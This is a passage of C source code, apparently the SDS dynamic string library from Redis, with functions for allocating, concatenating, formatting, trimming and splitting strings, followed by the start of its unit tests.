break;\n        }\n        case SDS_TYPE_32: {\n            SDS_HDR_VAR(32,s);\n            sh->len = initlen;\n            sh->alloc = initlen;\n            *fp = type;\n            break;\n        }\n        case SDS_TYPE_64: {\n            SDS_HDR_VAR(64,s);\n            sh->len = initlen;\n            sh->alloc = initlen;\n            *fp = type;\n            break;\n        }\n    }\n    if (initlen && init)\n        memcpy(s, init, initlen);\n    s[initlen] = '\\0';\n    return s;\n}\n\n/* Create an empty (zero length) sds string. Even in this case the string\n * always has an implicit null term. */\nsds sdsempty(void) {\n    return sdsnewlen(\"\",0);\n}\n\n/* Create a new sds string starting from a null terminated C string. */\nsds sdsnew(const char *init) {\n    size_t initlen = (init == NULL) ? 0 : strlen(init);\n    return sdsnewlen(init, initlen);\n}\n\n/* Duplicate an sds string. */\nsds sdsdup(const sds s) {\n    return sdsnewlen(s, sdslen(s));\n}\n\n/* Free an sds string. No operation is performed if 's' is NULL. */\nvoid sdsfree(sds s) {\n    if (s == NULL) return;\n    s_free((char*)s-sdsHdrSize(s[-1]));\n}\n\n/* Set the sds string length to the length as obtained with strlen(), so\n * considering as content only up to the first null term character.\n *\n * This function is useful when the sds string is hacked manually in some\n * way, like in the following example:\n *\n * s = sdsnew(\"foobar\");\n * s[2] = '\\0';\n * sdsupdatelen(s);\n * printf(\"%d\\n\", sdslen(s));\n *\n * The output will be \"2\", but if we comment out the call to sdsupdatelen()\n * the output will be \"6\" as the string was modified but the logical length\n * remains 6 bytes. */\nvoid sdsupdatelen(sds s) {\n    int reallen = strlen(s);\n    sdssetlen(s, reallen);\n}\n\n/* Modify an sds string in-place to make it empty (zero length).\n * However all the existing buffer is not discarded but set as free space\n * so that next append operations will not require allocations up to the\n * number of bytes previously available. */\nvoid sdsclear(sds s) {\n    sdssetlen(s, 0);\n    s[0] = '\\0';\n}\n\n/* Enlarge the free space at the end of the sds string so that the caller\n * is sure that after calling this function can overwrite up to addlen\n * bytes after the end of the string, plus one more byte for nul term.\n *\n * Note: this does not change the *length* of the sds string as returned\n * by sdslen(), but only the free buffer space we have. */\nsds sdsMakeRoomFor(sds s, size_t addlen) {\n    void *sh, *newsh;\n    size_t avail = sdsavail(s);\n    size_t len, newlen;\n    char type, oldtype = s[-1] & SDS_TYPE_MASK;\n    int hdrlen;\n\n    /* Return ASAP if there is enough space left. */\n    if (avail >= addlen) return s;\n\n    len = sdslen(s);\n    sh = (char*)s-sdsHdrSize(oldtype);\n    newlen = (len+addlen);\n    if (newlen < SDS_MAX_PREALLOC)\n        newlen *= 2;\n    else\n        newlen += SDS_MAX_PREALLOC;\n\n    type = sdsReqType(newlen);\n\n    /* Don't use type 5: the user is appending to the string and type 5 is\n     * not able to remember empty space, so sdsMakeRoomFor() must be called\n     * at every appending operation. */\n    if (type == SDS_TYPE_5) type = SDS_TYPE_8;\n\n    hdrlen = sdsHdrSize(type);\n    if (oldtype==type) {\n        newsh = s_realloc(sh, hdrlen+newlen+1);\n        if (newsh == NULL) return NULL;\n        s = (char*)newsh+hdrlen;\n    } else {\n        /* Since the header size changes, need to move the string forward,\n         * and can't use realloc */\n        newsh = s_malloc(hdrlen+newlen+1);\n        if (newsh == NULL) return NULL;\n        memcpy((char*)newsh+hdrlen, s, len+1);\n        s_free(sh);\n        s = (char*)newsh+hdrlen;\n        s[-1] = type;\n        sdssetlen(s, len);\n    }\n    sdssetalloc(s, newlen);\n    return s;\n}\n\n/* Reallocate the sds string so that it has no free space at the end. The\n * contained string remains not altered, but next concatenation operations\n * will require a reallocation.\n *\n * After the call, the passed sds string is no longer valid and all the\n * references must be substituted with the new pointer returned by the call. */\nsds sdsRemoveFreeSpace(sds s) {\n    void *sh, *newsh;\n    char type, oldtype = s[-1] & SDS_TYPE_MASK;\n    int hdrlen;\n    size_t len = sdslen(s);\n    sh = (char*)s-sdsHdrSize(oldtype);\n\n    type = sdsReqType(len);\n    hdrlen = sdsHdrSize(type);\n    if (oldtype==type) {\n        newsh = s_realloc(sh, hdrlen+len+1);\n        if (newsh == NULL) return NULL;\n        s = (char*)newsh+hdrlen;\n    } else {\n        newsh = s_malloc(hdrlen+len+1);\n        if (newsh == NULL) return NULL;\n        memcpy((char*)newsh+hdrlen, s, len+1);\n        s_free(sh);\n        s = (char*)newsh+hdrlen;\n        s[-1] = type;\n        sdssetlen(s, len);\n    }\n    sdssetalloc(s, len);\n    return s;\n}\n\n/* Return the total size of the allocation of the specifed sds string,\n * including:\n * 1) The sds header before the pointer.\n * 2) The string.\n * 3) The free buffer at the end if any.\n * 4) The implicit null term.\n */\nsize_t sdsAllocSize(sds s) {\n    size_t alloc = sdsalloc(s);\n    return sdsHdrSize(s[-1])+alloc+1;\n}\n\n/* Return the pointer of the actual SDS allocation (normally SDS strings\n * are referenced by the start of the string buffer). */\nvoid *sdsAllocPtr(sds s) {\n    return (void*) (s-sdsHdrSize(s[-1]));\n}\n\n/* Increment the sds length and decrements the left free space at the\n * end of the string according to 'incr'. Also set the null term\n * in the new end of the string.\n *\n * This function is used in order to fix the string length after the\n * user calls sdsMakeRoomFor(), writes something after the end of\n * the current string, and finally needs to set the new length.\n *\n * Note: it is possible to use a negative increment in order to\n * right-trim the string.\n *\n * Usage example:\n *\n * Using sdsIncrLen() and sdsMakeRoomFor() it is possible to mount the\n * following schema, to cat bytes coming from the kernel to the end of an\n * sds string without copying into an intermediate buffer:\n *\n * oldlen = sdslen(s);\n * s = sdsMakeRoomFor(s, BUFFER_SIZE);\n * nread = read(fd, s+oldlen, BUFFER_SIZE);\n * ... check for nread <= 0 and handle it ...\n * sdsIncrLen(s, nread);\n */\nvoid sdsIncrLen(sds s, int incr) {\n    unsigned char flags = s[-1];\n    size_t len;\n    switch(flags&SDS_TYPE_MASK) {\n        case SDS_TYPE_5: {\n            unsigned char *fp = ((unsigned char*)s)-1;\n            unsigned char oldlen = SDS_TYPE_5_LEN(flags);\n            assert((incr > 0 && oldlen+incr < 32) || (incr < 0 && oldlen >= (unsigned int)(-incr)));\n            *fp = SDS_TYPE_5 | ((oldlen+incr) << SDS_TYPE_BITS);\n            len = oldlen+incr;\n            break;\n        }\n        case SDS_TYPE_8: {\n            SDS_HDR_VAR(8,s);\n            assert((incr >= 0 && sh->alloc-sh->len >= incr) || (incr < 0 && sh->len >= (unsigned int)(-incr)));\n            len = (sh->len += incr);\n            break;\n        }\n        case SDS_TYPE_16: {\n            SDS_HDR_VAR(16,s);\n            assert((incr >= 0 && sh->alloc-sh->len >= incr) || (incr < 0 && sh->len >= (unsigned int)(-incr)));\n            len = (sh->len += incr);\n            break;\n        }\n        case SDS_TYPE_32: {\n            SDS_HDR_VAR(32,s);\n            assert((incr >= 0 && sh->alloc-sh->len >= (unsigned int)incr) || (incr < 0 && sh->len >= (unsigned int)(-incr)));\n            len = (sh->len += incr);\n            break;\n        }\n        case SDS_TYPE_64: {\n            SDS_HDR_VAR(64,s);\n            assert((incr >= 0 && sh->alloc-sh->len >= (uint64_t)incr) || (incr < 0 && sh->len >= (uint64_t)(-incr)));\n            len = (sh->len += incr);\n            break;\n        }\n        default: len = 0; /* Just to avoid compilation warnings. */\n    }\n    s[len] = '\\0';\n}\n\n/* Grow the sds to have the specified length. Bytes that were not part of\n * the original length of the sds will be set to zero.\n *\n * if the specified length is smaller than the current length, no operation\n * is performed. */\nsds sdsgrowzero(sds s, size_t len) {\n    size_t curlen = sdslen(s);\n\n    if (len <= curlen) return s;\n    s = sdsMakeRoomFor(s,len-curlen);\n    if (s == NULL) return NULL;\n\n    /* Make sure added region doesn't contain garbage */\n    memset(s+curlen,0,(len-curlen+1)); /* also set trailing \\0 byte */\n    sdssetlen(s, len);\n    return s;\n}\n\n/* Append the specified binary-safe string pointed by 't' of 'len' bytes to the\n * end of the specified sds string 's'.\n *\n * After the call, the passed sds string is no longer valid and all the\n * references must be substituted with the new pointer returned by the call. */\nsds sdscatlen(sds s, const void *t, size_t len) {\n    size_t curlen = sdslen(s);\n\n    s = sdsMakeRoomFor(s,len);\n    if (s == NULL) return NULL;\n    memcpy(s+curlen, t, len);\n    sdssetlen(s, curlen+len);\n    s[curlen+len] = '\\0';\n    return s;\n}\n\n/* Append the specified null termianted C string to the sds string 's'.\n *\n * After the call, the passed sds string is no longer valid and all the\n * references must be substituted with the new pointer returned by the call. */\nsds sdscat(sds s, const char *t) {\n    return sdscatlen(s, t, strlen(t));\n}\n\n/* Append the specified sds 't' to the existing sds 's'.\n *\n * After the call, the modified sds string is no longer valid and all the\n * references must be substituted with the new pointer returned by the call. */\nsds sdscatsds(sds s, const sds t) {\n    return sdscatlen(s, t, sdslen(t));\n}\n\n/* Destructively modify the sds string 's' to hold the specified binary\n * safe string pointed by 't' of length 'len' bytes. */\nsds sdscpylen(sds s, const char *t, size_t len) {\n    if (sdsalloc(s) < len) {\n        s = sdsMakeRoomFor(s,len-sdslen(s));\n        if (s == NULL) return NULL;\n    }\n    memcpy(s, t, len);\n    s[len] = '\\0';\n    sdssetlen(s, len);\n    return s;\n}\n\n/* Like sdscpylen() but 't' must be a null-termined string so that the length\n * of the string is obtained with strlen(). */\nsds sdscpy(sds s, const char *t) {\n    return sdscpylen(s, t, strlen(t));\n}\n\n/* Helper for sdscatlonglong() doing the actual number -> string\n * conversion. 's' must point to a string with room for at least\n * SDS_LLSTR_SIZE bytes.\n *\n * The function returns the length of the null-terminated string\n * representation stored at 's'. */\n#define SDS_LLSTR_SIZE 21\nint sdsll2str(char *s, long long value) {\n    char *p, aux;\n    unsigned long long v;\n    size_t l;\n\n    /* Generate the string representation, this method produces\n     * an reversed string. */\n    v = (value < 0) ? -value : value;\n    p = s;\n    do {\n        *p++ = '0'+(v%10);\n        v /= 10;\n    } while(v);\n    if (value < 0) *p++ = '-';\n\n    /* Compute length and add null term. */\n    l = p-s;\n    *p = '\\0';\n\n    /* Reverse the string. */\n    p--;\n    while(s < p) {\n        aux = *s;\n        *s = *p;\n        *p = aux;\n        s++;\n        p--;\n    }\n    return l;\n}\n\n/* Identical sdsll2str(), but for unsigned long long type. */\nint sdsull2str(char *s, unsigned long long v) {\n    char *p, aux;\n    size_t l;\n\n    /* Generate the string representation, this method produces\n     * an reversed string. */\n    p = s;\n    do {\n        *p++ = '0'+(v%10);\n        v /= 10;\n    } while(v);\n\n    /* Compute length and add null term. */\n    l = p-s;\n    *p = '\\0';\n\n    /* Reverse the string. */\n    p--;\n    while(s < p) {\n        aux = *s;\n        *s = *p;\n        *p = aux;\n        s++;\n        p--;\n    }\n    return l;\n}\n\n/* Create an sds string from a long long value. It is much faster than:\n *\n * sdscatprintf(sdsempty(),\"%lld\\n\", value);\n */\nsds sdsfromlonglong(long long value) {\n    char buf[SDS_LLSTR_SIZE];\n    int len = sdsll2str(buf,value);\n\n    return sdsnewlen(buf,len);\n}\n\n/* Like sdscatprintf() but gets va_list instead of being variadic. */\nsds sdscatvprintf(sds s, const char *fmt, va_list ap) {\n    va_list cpy;\n    char staticbuf[1024], *buf = staticbuf, *t;\n    size_t buflen = strlen(fmt)*2;\n\n    /* We try to start using a static buffer for speed.\n     * If not possible we revert to heap allocation. */\n    if (buflen > sizeof(staticbuf)) {\n        buf = s_malloc(buflen);\n        if (buf == NULL) return NULL;\n    } else {\n        buflen = sizeof(staticbuf);\n    }\n\n    /* Try with buffers two times bigger every time we fail to\n     * fit the string in the current buffer size. */\n    while(1) {\n        buf[buflen-2] = '\\0';\n        va_copy(cpy,ap);\n        vsnprintf(buf, buflen, fmt, cpy);\n        va_end(cpy);\n        if (buf[buflen-2] != '\\0') {\n            if (buf != staticbuf) s_free(buf);\n            buflen *= 2;\n            buf = s_malloc(buflen);\n            if (buf == NULL) return NULL;\n            continue;\n        }\n        break;\n    }\n\n    /* Finally concat the obtained string to the SDS string and return it. */\n    t = sdscat(s, buf);\n    if (buf != staticbuf) s_free(buf);\n    return t;\n}\n\n/* Append to the sds string 's' a string obtained using printf-alike format\n * specifier.\n *\n * After the call, the modified sds string is no longer valid and all the\n * references must be substituted with the new pointer returned by the call.\n *\n * Example:\n *\n * s = sdsnew(\"Sum is: \");\n * s = sdscatprintf(s,\"%d+%d = %d\",a,b,a+b).\n *\n * Often you need to create a string from scratch with the printf-alike\n * format. When this is the need, just use sdsempty() as the target string:\n *\n * s = sdscatprintf(sdsempty(), \"... your format ...\", args);\n */\nsds sdscatprintf(sds s, const char *fmt, ...) {\n    va_list ap;\n    char *t;\n    va_start(ap, fmt);\n    t = sdscatvprintf(s,fmt,ap);\n    va_end(ap);\n    return t;\n}\n\n/* This function is similar to sdscatprintf, but much faster as it does\n * not rely on sprintf() family functions implemented by the libc that\n * are often very slow. Moreover directly handling the sds string as\n * new data is concatenated provides a performance improvement.\n *\n * However this function only handles an incompatible subset of printf-alike\n * format specifiers:\n *\n * %s - C String\n * %S - SDS string\n * %i - signed int\n * %I - 64 bit signed integer (long long, int64_t)\n * %u - unsigned int\n * %U - 64 bit unsigned integer (unsigned long long, uint64_t)\n * %% - Verbatim \"%\" character.\n */\nsds sdscatfmt(sds s, char const *fmt, ...) {\n    size_t initlen = sdslen(s);\n    const char *f = fmt;\n    int i;\n    va_list ap;\n\n    va_start(ap,fmt);\n    f = fmt;    /* Next format specifier byte to process. */\n    i = initlen; /* Position of the next byte to write to dest str. */\n    while(*f) {\n        char next, *str;\n        size_t l;\n        long long num;\n        unsigned long long unum;\n\n        /* Make sure there is always space for at least 1 char. */\n        if (sdsavail(s)==0) {\n            s = sdsMakeRoomFor(s,1);\n        }\n\n        switch(*f) {\n        case '%':\n            next = *(f+1);\n            f++;\n            switch(next) {\n            case 's':\n            case 'S':\n                str = va_arg(ap,char*);\n                l = (next == 's') ? strlen(str) : sdslen(str);\n                if (sdsavail(s) < l) {\n                    s = sdsMakeRoomFor(s,l);\n                }\n                memcpy(s+i,str,l);\n                sdsinclen(s,l);\n                i += l;\n                break;\n            case 'i':\n            case 'I':\n                if (next == 'i')\n                    num = va_arg(ap,int);\n                else\n                    num = va_arg(ap,long long);\n                {\n                    char buf[SDS_LLSTR_SIZE];\n                    l = sdsll2str(buf,num);\n                    if (sdsavail(s) < l) {\n                        s = sdsMakeRoomFor(s,l);\n                    }\n                    memcpy(s+i,buf,l);\n                    sdsinclen(s,l);\n                    i += l;\n                }\n                break;\n            case 'u':\n            case 'U':\n                if (next == 'u')\n                    unum = va_arg(ap,unsigned int);\n                else\n                    unum = va_arg(ap,unsigned long long);\n                {\n                    char buf[SDS_LLSTR_SIZE];\n                    l = sdsull2str(buf,unum);\n                    if (sdsavail(s) < l) {\n                        s = sdsMakeRoomFor(s,l);\n                    }\n                    memcpy(s+i,buf,l);\n                    sdsinclen(s,l);\n                    i += l;\n                }\n                break;\n            default: /* Handle %% and generally %<unknown>. */\n                s[i++] = next;\n                sdsinclen(s,1);\n                break;\n            }\n            break;\n        default:\n            s[i++] = *f;\n            sdsinclen(s,1);\n            break;\n        }\n        f++;\n    }\n    va_end(ap);\n\n    /* Add null-term */\n    s[i] = '\\0';\n    return s;\n}\n\n/* Remove the part of the string from left and from right composed just of\n * contiguous characters found in 'cset', that is a null terminted C string.\n *\n * After the call, the modified sds string is no longer valid and all the\n * references must be substituted with the new pointer returned by the call.\n *\n * Example:\n *\n * s = sdsnew(\"AA...AA.a.aa.aHelloWorld     :::\");\n * s = sdstrim(s,\"Aa. :\");\n * printf(\"%s\\n\", s);\n *\n * Output will be just \"Hello World\".\n */\nsds sdstrim(sds s, const char *cset) {\n    char *start, *end, *sp, *ep;\n    size_t len;\n\n    sp = start = s;\n    ep = end = s+sdslen(s)-1;\n    while(sp <= end && strchr(cset, *sp)) sp++;\n    while(ep > sp && strchr(cset, *ep)) ep--;\n    len = (sp > ep) ? 0 : ((ep-sp)+1);\n    if (s != sp) memmove(s, sp, len);\n    s[len] = '\\0';\n    sdssetlen(s,len);\n    return s;\n}\n\n/* Turn the string into a smaller (or equal) string containing only the\n * substring specified by the 'start' and 'end' indexes.\n *\n * start and end can be negative, where -1 means the last character of the\n * string, -2 the penultimate character, and so forth.\n *\n * The interval is inclusive, so the start and end characters will be part\n * of the resulting string.\n *\n * The string is modified in-place.\n *\n * Example:\n *\n * s = sdsnew(\"Hello World\");\n * sdsrange(s,1,-1); => \"ello World\"\n */\nvoid sdsrange(sds s, int start, int end) {\n    size_t newlen, len = sdslen(s);\n\n    if (len == 0) return;\n    if (start < 0) {\n        start = len+start;\n        if (start < 0) start = 0;\n    }\n    if (end < 0) {\n        end = len+end;\n        if (end < 0) end = 0;\n    }\n    newlen = (start > end) ? 0 : (end-start)+1;\n    if (newlen != 0) {\n        if (start >= (signed)len) {\n            newlen = 0;\n        } else if (end >= (signed)len) {\n            end = len-1;\n            newlen = (start > end) ? 0 : (end-start)+1;\n        }\n    } else {\n        start = 0;\n    }\n    if (start && newlen) memmove(s, s+start, newlen);\n    s[newlen] = 0;\n    sdssetlen(s,newlen);\n}\n\n/* Apply tolower() to every character of the sds string 's'. */\nvoid sdstolower(sds s) {\n    int len = sdslen(s), j;\n\n    for (j = 0; j < len; j++) s[j] = tolower(s[j]);\n}\n\n/* Apply toupper() to every character of the sds string 's'. */\nvoid sdstoupper(sds s) {\n    int len = sdslen(s), j;\n\n    for (j = 0; j < len; j++) s[j] = toupper(s[j]);\n}\n\n/* Compare two sds strings s1 and s2 with memcmp().\n *\n * Return value:\n *\n *     positive if s1 > s2.\n *     negative if s1 < s2.\n *     0 if s1 and s2 are exactly the same binary string.\n *\n * If two strings share exactly the same prefix, but one of the two has\n * additional characters, the longer string is considered to be greater than\n * the smaller one. */\nint sdscmp(const sds s1, const sds s2) {\n    size_t l1, l2, minlen;\n    int cmp;\n\n    l1 = sdslen(s1);\n    l2 = sdslen(s2);\n    minlen = (l1 < l2) ? l1 : l2;\n    cmp = memcmp(s1,s2,minlen);\n    if (cmp == 0) return l1-l2;\n    return cmp;\n}\n\n/* Split 's' with separator in 'sep'. An array\n * of sds strings is returned. *count will be set\n * by reference to the number of tokens returned.\n *\n * On out of memory, zero length string, zero length\n * separator, NULL is returned.\n *\n * Note that 'sep' is able to split a string using\n * a multi-character separator. For example\n * sdssplit(\"foo_-_bar\",\"_-_\"); will return two\n * elements \"foo\" and \"bar\".\n *\n * This version of the function is binary-safe but\n * requires length arguments. sdssplit() is just the\n * same function but for zero-terminated strings.\n */\nsds *sdssplitlen(const char *s, int len, const char *sep, int seplen, int *count) {\n    int elements = 0, slots = 5, start = 0, j;\n    sds *tokens;\n\n    if (seplen < 1 || len < 0) return NULL;\n\n    tokens = s_malloc(sizeof(sds)*slots);\n    if (tokens == NULL) return NULL;\n\n    if (len == 0) {\n        *count = 0;\n        return tokens;\n    }\n    for (j = 0; j < (len-(seplen-1)); j++) {\n        /* make sure there is room for the next element and the final one */\n        if (slots < elements+2) {\n            sds *newtokens;\n\n            slots *= 2;\n            newtokens = s_realloc(tokens,sizeof(sds)*slots);\n            if (newtokens == NULL) goto cleanup;\n            tokens = newtokens;\n        }\n        /* search the separator */\n        if ((seplen == 1 && *(s+j) == sep[0]) || (memcmp(s+j,sep,seplen) == 0)) {\n            tokens[elements] = sdsnewlen(s+start,j-start);\n            if (tokens[elements] == NULL) goto cleanup;\n            elements++;\n            start = j+seplen;\n            j = j+seplen-1; /* skip the separator */\n        }\n    }\n    /* Add the final element. We are sure there is room in the tokens array. */\n    tokens[elements] = sdsnewlen(s+start,len-start);\n    if (tokens[elements] == NULL) goto cleanup;\n    elements++;\n    *count = elements;\n    return tokens;\n\ncleanup:\n    {\n        int i;\n        for (i = 0; i < elements; i++) sdsfree(tokens[i]);\n        s_free(tokens);\n        *count = 0;\n        return NULL;\n    }\n}\n\n/* Free the result returned by sdssplitlen(), or do nothing if 'tokens' is NULL. */\nvoid sdsfreesplitres(sds *tokens, int count) {\n    if (!tokens) return;\n    while(count--)\n        sdsfree(tokens[count]);\n    s_free(tokens);\n}\n\n/* Append to the sds string \"s\" an escaped string representation where\n * all the non-printable characters (tested with isprint()) are turned into\n * escapes in the form \"\\n\\r\\a....\" or \"\\x<hex-number>\".\n *\n * After the call, the modified sds string is no longer valid and all the\n * references must be substituted with the new pointer returned by the call. */\nsds sdscatrepr(sds s, const char *p, size_t len) {\n    s = sdscatlen(s,\"\\\"\",1);\n    while(len--) {\n        switch(*p) {\n        case '\\\\':\n        case '\"':\n            s = sdscatprintf(s,\"\\\\%c\",*p);\n            break;\n        case '\\n': s = sdscatlen(s,\"\\\\n\",2); break;\n        case '\\r': s = sdscatlen(s,\"\\\\r\",2); break;\n        case '\\t': s = sdscatlen(s,\"\\\\t\",2); break;\n        case '\\a': s = sdscatlen(s,\"\\\\a\",2); break;\n        case '\\b': s = sdscatlen(s,\"\\\\b\",2); break;\n        default:\n            if (isprint(*p))\n                s = sdscatprintf(s,\"%c\",*p);\n            else\n                s = sdscatprintf(s,\"\\\\x%02x\",(unsigned char)*p);\n            break;\n        }\n        p++;\n    }\n    return sdscatlen(s,\"\\\"\",1);\n}\n\n/* Helper function for sdssplitargs() that returns non zero if 'c'\n * is a valid hex digit. */\nint is_hex_digit(char c) {\n    return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') ||\n           (c >= 'A' && c <= 'F');\n}\n\n/* Helper function for sdssplitargs() that converts a hex digit into an\n * integer from 0 to 15 */\nint hex_digit_to_int(char c) {\n    switch(c) {\n    case '0': return 0;\n    case '1': return 1;\n    case '2': return 2;\n    case '3': return 3;\n    case '4': return 4;\n    case '5': return 5;\n    case '6': return 6;\n    case '7': return 7;\n    case '8': return 8;\n    case '9': return 9;\n    case 'a': case 'A': return 10;\n    case 'b': case 'B': return 11;\n    case 'c': case 'C': return 12;\n    case 'd': case 'D': return 13;\n    case 'e': case 'E': return 14;\n    case 'f': case 'F': return 15;\n    default: return 0;\n    }\n}\n\n/* Split a line into arguments, where every argument can be in the\n * following programming-language REPL-alike form:\n *\n * foo bar \"newline are supported\\n\" and \"\\xff\\x00otherstuff\"\n *\n * The number of arguments is stored into *argc, and an array\n * of sds is returned.\n *\n * The caller should free the resulting array of sds strings with\n * sdsfreesplitres().\n *\n * Note that sdscatrepr() is able to convert back a string into\n * a quoted string in the same format sdssplitargs() is able to parse.\n *\n * The function returns the allocated tokens on success, even when the\n * input string is empty, or NULL if the input contains unbalanced\n * quotes or closed quotes followed by non space characters\n * as in: \"foo\"bar or \"foo'\n */\nsds *sdssplitargs(const char *line, int *argc) {\n    const char *p = line;\n    char *current = NULL;\n    char **vector = NULL;\n\n    *argc = 0;\n    while(1) {\n        /* skip blanks */\n        while(*p && isspace(*p)) p++;\n        if (*p) {\n            /* get a token */\n            int inq=0;  /* set to 1 if we are in \"quotes\" */\n            int insq=0; /* set to 1 if we are in 'single quotes' */\n            int done=0;\n\n            if (current == NULL) current = sdsempty();\n            while(!done) {\n                if (inq) {\n                    if (*p == '\\\\' && *(p+1) == 'x' &&\n                                             is_hex_digit(*(p+2)) &&\n                                             is_hex_digit(*(p+3)))\n                    {\n                        unsigned char byte;\n\n                        byte = (hex_digit_to_int(*(p+2))*16)+\n                                hex_digit_to_int(*(p+3));\n                        current = sdscatlen(current,(char*)&byte,1);\n                        p += 3;\n                    } else if (*p == '\\\\' && *(p+1)) {\n                        char c;\n\n                        p++;\n                        switch(*p) {\n                        case 'n': c = '\\n'; break;\n                        case 'r': c = '\\r'; break;\n                        case 't': c = '\\t'; break;\n                        case 'b': c = '\\b'; break;\n                        case 'a': c = '\\a'; break;\n                        default: c = *p; break;\n                        }\n                        current = sdscatlen(current,&c,1);\n                    } else if (*p == '\"') {\n                        /* closing quote must be followed by a space or\n                         * nothing at all. */\n                        if (*(p+1) && !isspace(*(p+1))) goto err;\n                        done=1;\n                    } else if (!*p) {\n                        /* unterminated quotes */\n                        goto err;\n                    } else {\n                        current = sdscatlen(current,p,1);\n                    }\n                } else if (insq) {\n                    if (*p == '\\\\' && *(p+1) == '\\'') {\n                        p++;\n                        current = sdscatlen(current,\"'\",1);\n                    } else if (*p == '\\'') {\n                        /* closing quote must be followed by a space or\n                         * nothing at all. */\n                        if (*(p+1) && !isspace(*(p+1))) goto err;\n                        done=1;\n                    } else if (!*p) {\n                        /* unterminated quotes */\n                        goto err;\n                    } else {\n                        current = sdscatlen(current,p,1);\n                    }\n                } else {\n                    switch(*p) {\n                    case ' ':\n                    case '\\n':\n                    case '\\r':\n                    case '\\t':\n                    case '\\0':\n                        done=1;\n                        break;\n                    case '\"':\n                        inq=1;\n                        break;\n                    case '\\'':\n                        insq=1;\n                        break;\n                    default:\n                        current = sdscatlen(current,p,1);\n                        break;\n                    }\n                }\n                if (*p) p++;\n            }\n            /* add the token to the vector */\n            vector = s_realloc(vector,((*argc)+1)*sizeof(char*));\n            vector[*argc] = current;\n            (*argc)++;\n            current = NULL;\n        } else {\n            /* Even on empty input string return something not NULL. */\n            if (vector == NULL) vector = s_malloc(sizeof(void*));\n            return vector;\n        }\n    }\n\nerr:\n    while((*argc)--)\n        sdsfree(vector[*argc]);\n    s_free(vector);\n    if (current) sdsfree(current);\n    *argc = 0;\n    return NULL;\n}\n\n/* Modify the string substituting all the occurrences of the set of\n * characters specified in the 'from' string to the corresponding character\n * in the 'to' array.\n *\n * For instance: sdsmapchars(mystring, \"ho\", \"01\", 2)\n * will have the effect of turning the string \"hello\" into \"0ell1\".\n *\n * The function returns the sds string pointer, that is always the same\n * as the input pointer since no resize is needed. */\nsds sdsmapchars(sds s, const char *from, const char *to, size_t setlen) {\n    size_t j, i, l = sdslen(s);\n\n    for (j = 0; j < l; j++) {\n        for (i = 0; i < setlen; i++) {\n            if (s[j] == from[i]) {\n                s[j] = to[i];\n                break;\n            }\n        }\n    }\n    return s;\n}\n\n/* Join an array of C strings using the specified separator (also a C string).\n * Returns the result as an sds string. */\nsds sdsjoin(char **argv, int argc, char *sep) {\n    sds join = sdsempty();\n    int j;\n\n    for (j = 0; j < argc; j++) {\n        join = sdscat(join, argv[j]);\n        if (j != argc-1) join = sdscat(join,sep);\n    }\n    return join;\n}\n\n/* Like sdsjoin, but joins an array of SDS strings. */\nsds sdsjoinsds(sds *argv, int argc, const char *sep, size_t seplen) {\n    sds join = sdsempty();\n    int j;\n\n    for (j = 0; j < argc; j++) {\n        join = sdscatsds(join, argv[j]);\n        if (j != argc-1) join = sdscatlen(join,sep,seplen);\n    }\n    return join;\n}\n\n/* Wrappers to the allocators used by SDS. Note that SDS will actually\n * just use the macros defined into sdsalloc.h in order to avoid to pay\n * the overhead of function calls. Here we define these wrappers only for\n * the programs SDS is linked to, if they want to touch the SDS internals\n * even if they use a different allocator. */\nvoid *sds_malloc(size_t size) { return s_malloc(size); }\nvoid *sds_realloc(void *ptr, size_t size) { return s_realloc(ptr,size); }\nvoid sds_free(void *ptr) { s_free(ptr); }\n\n#if defined(SDS_TEST_MAIN)\n#include <stdio.h>\n#include \"testhelp.h\"\n#include \"limits.h\"\n\n#define UNUSED(x) (void)(x)\nint sdsTest(void) {\n    {\n        sds x = sdsnew(\"foo\"), y;\n\n        test_cond(\"Create a string and obtain the length\",\n            sdslen(x) == 3 && memcmp(x,\"foo\\0\",4) == 0)\n\n        sdsfree(x);\n        x = sdsnewlen(\"foo\",2);\n        test_cond(\"Create a string with specified length\",\n            sdslen(x) == 2 && memcmp(x,\"fo\\0\",3) == 0)\n\n        x = sdscat(x,\"bar\");\n        test_cond(\"Strings concatenation\",\n            sdslen(x) == 5 && memcmp(x,\"fobar\\0\",6) == 0);\n\n        x = sdscpy(x,\"a\");\n        test_cond(\"sdscpy() against an originally longer string\",\n            sdslen(x) == 1 && memcmp(x,\"a\\0\",2) == 0)\n\n        x = sdscpy(x,\"xyzxxxxxxxxxxyyyyyyyyyykkkkkkkkkk\");\n        test_cond(\"sdscpy() against an originally shorter string\",\n            sdslen(x) == 33 &&\n            memcmp(x,\"xyzxxxxxxxxxxyyyyyyyyyykkkkkkkkkk\\0\",33) == 0)\n\n        sdsfree(x);\n        x = sdscatprintf(sdsempty(),\"%d\",123);\n        test_cond(\"sdscatprintf() seems working in the base case\",\n            sdslen(x) == 3 && memcmp(x,\"123\\0\",4) == 0)\n\n        sdsfree(x);\n        x = sdsnew(\"--\");\n        x = sdscatfmt(x, \"Hello %s World %I,%I--\", \"Hi!\", LLONG_MIN,LLONG_MAX);\n        test_cond(\"sdscatfmt() seems working in the base case\",\n            sdslen(x) == 60 &&\n            memcmp(x,\"--Hello Hi! World -9223372036854775808,\"\n                     \"9223372036854775807--\",60) == 0)\n        printf(\"[%s]\\n\",x);\n\n        sdsfree(x);\n        x = sdsnew(\"--\");\n        x = sdscatfmt(x, \"%u,%U--\", UINT_MAX, ULLONG_MAX);\n        test_cond(\"sdscatfmt() seems working with unsigned numbers\",\n            sdslen(x) == 35 &&\n            memcmp(x,\"--4294967295,18446744073709551615--\",35) == 0)\n\n        sdsfree(x);\n        x = sdsnew(\" x \");\n        sdstrim(x,\" x\");\n        test_cond(\"sdstrim() works when all chars match\",\n            sdslen(x) == 0)\n\n        sdsfree(x);\n        x = sdsnew(\" x \");\n        sdstrim(x,\" \");\n        test_cond(\"sdstrim() works when a single char remains\",\n            sdslen(x) == 1 && x[0] == 'x')\n\n        sdsfree(x);\n        x = sdsnew(\"xxciaoyyy\");\n        sdstrim(x,\"xy\");\n        test_cond(\"sdstrim() correctly trims characters\",\n            sdslen(x) == 4 && memcmp(x,\"ciao\\0\",5) == 0)\n\n        y = sdsdup(x);\n        sdsrange(y,1,1);\n        test_cond(\"sdsrange(...,1,1)\",\n            sdslen(y) == 1 && memcmp(y,\"i\\0\",2) == 0)\n\n        sdsfree(y);\n        y = sdsdup(x);\n        sdsrange(y,1,-1);\n        test_cond(\"sdsrange(...,1,-1)\",\n            sdslen(y) == 3 && memcmp(y,\"iao\\0\",4) == 